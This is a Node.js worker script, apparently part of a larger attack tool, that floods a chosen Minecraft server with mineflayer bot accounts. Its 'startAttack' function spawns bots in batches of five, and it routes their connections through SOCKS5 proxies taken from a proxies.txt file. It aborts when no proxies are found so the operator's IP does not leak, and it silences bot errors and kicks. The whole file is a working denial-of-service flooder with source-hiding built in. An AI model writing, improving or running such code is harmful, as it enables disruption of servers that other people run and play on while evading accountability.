const { parentPort, workerData } = require('worker_threads');
const mineflayer = require('mineflayer');
const { SocksClient } = require('socks');
const fs = require('fs');
const path = require('path');

const { ip, port, numBots, useProxy } = workerData;
let bots = [];
let proxies = [];

parentPort.postMessage({ type: 'log', message: `[DEBUG] Worker process started. Parsing proxies...` });

// Try multiple paths for proxies
try {
    const p1 = path.join(process.cwd(), 'proxies.txt');
    const p2 = path.join(__dirname, '../../proxies.txt');

    if (fs.existsSync(p1)) {
        const raw = fs.readFileSync(p1, 'utf-8');
        proxies = raw.split('\n').map(l => l.trim()).filter(l => l.length > 0);
        parentPort.postMessage({ type: 'log', message: `[DEBUG] Loaded ${proxies.length} proxies from ${p1}` });
    } else if (fs.existsSync(p2)) {
        const raw = fs.readFileSync(p2, 'utf-8');
        proxies = raw.split('\n').map(l => l.trim()).filter(l => l.length > 0);
        parentPort.postMessage({ type: 'log', message: `[DEBUG] Loaded ${proxies.length} proxies from ${p2}` });
    }
} catch (e) {
    parentPort.postMessage({ type: 'log', message: `[DEBUG] Proxy load failed: ${e.message}` });
}

if (useProxy && proxies.length === 0) {
    parentPort.postMessage({ type: 'log', message: 'CRITICAL: Proxy mode enabled but no proxies found! Aborting to prevent IP leak.' });
    setTimeout(() => process.exit(1), 2000);
}

// Log Throttling Queue
let logQueue = [];
setInterval(() => {
    if (logQueue.length > 0) {
        // Summarize joins if too many
        const joinLogs = logQueue.filter(l => l.includes('joined server'));
        const otherLogs = logQueue.filter(l => !l.includes('joined server'));

        if (joinLogs.length > 5) {
            parentPort.postMessage({ type: 'log', message: `[BATCH] ${joinLogs.length} units deployed and connected.` });
        } else {
            joinLogs.forEach(l => parentPort.postMessage({ type: 'log', message: l }));
        }

        otherLogs.forEach(l => parentPort.postMessage({ type: 'log', message: l }));
        logQueue = [];
    }
}, 1000); // Flush logs every second

function queueLog(msg) {
    logQueue.push(msg);
}

function startAttack() {
    let created = 0;
    const interval = setInterval(() => {
        if (created >= numBots) {
            clearInterval(interval);
            queueLog(`All ${numBots} units deployed. Proxy Pool: ${proxies.length > 0 ? 'ACTIVE' : 'INACTIVE'}`);
            return;
        }

        const batch = Math.min(5, numBots - created);
        for (let k = 0; k < batch; k++) {
            spawnBot();
            created++;
        }
    }, 200); // Slower spawn rate to prevent CPU spike
}

function spawnBot() {
    const botName = `MzBot_${Math.floor(Math.random() * 99999)}`;
    let proxyOpts = null;
    if (useProxy && proxies.length > 0) {
        const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
        const parts = proxyAddr.split(':');
        if (parts.length >= 2) {
            proxyOpts = { host: parts[0], port: parseInt(parts[1]), type: 5 };
        }
    }

    try {
        const options = {
            host: ip,
            port: parseInt(port),
            username: botName,
            hideErrors: true,
            checkTimeoutInterval: 60000,
            version: useProxy ? '1.20.1' : false,
            viewDistance: 'tiny', // Minimal chunk loading
            colorsEnabled: false,
            skinParts: { showCars: false, showCloak: false, showJacket: false, showHat: false, showLeftSleeve: false, showRightSleeve: false, showLeftPants: false, showRightPants: false },
            physicsEnabled: false // Disable physics engine entirely (requires custom logic to override default plugin or property setting after spawn)
        };

        if (useProxy && proxyOpts) {
            options.connect = (client) => {
                SocksClient.createConnection({
                    proxy: { ipaddress: proxyOpts.host, port: proxyOpts.port, type: 5 },
                    command: 'connect',
                    destination: { host: ip, port: parseInt(port) }
                }).then((info) => {
                    client.setSocket(info.socket);
                    client.emit('connect');
                }).catch((err) => {
                    client.emit('error', err);
                });
            };
        }

        const bot = mineflayer.createBot(options);

        // Disable heavy internal features
        bot.on('inject_allowed', () => {
            // Disable physics loop
            if (bot.physics) bot.physics.enabled = false;
        });

        bot.on('login', () => {
            if (bot.physics) bot.physics.enabled = false; // Double check
            queueLog(`[SUCCESS] ${botName} joined server!`);
        });

        bot.on('error', () => { });
        bot.on('kicked', () => { });
        bot.on('end', () => { });
        bot.on('spawn', () => {
            if (bot.physics) bot.physics.enabled = false;
            // Unsubscribe from chunk updates to save RAM? 
            // Mineflayer doesn't easily allow unlistening to 'chunkColumnKey', but we can ignore processing.
        });

        bots.push(bot);
    } catch (e) { }
}

startAttack();

parentPort.on('message', (msg) => {
    if (msg === 'stop') {
        bots.forEach(b => b.end());
        bots = [];
        parentPort.postMessage({ type: 'stopped' });
        process.exit(0);
    }
});
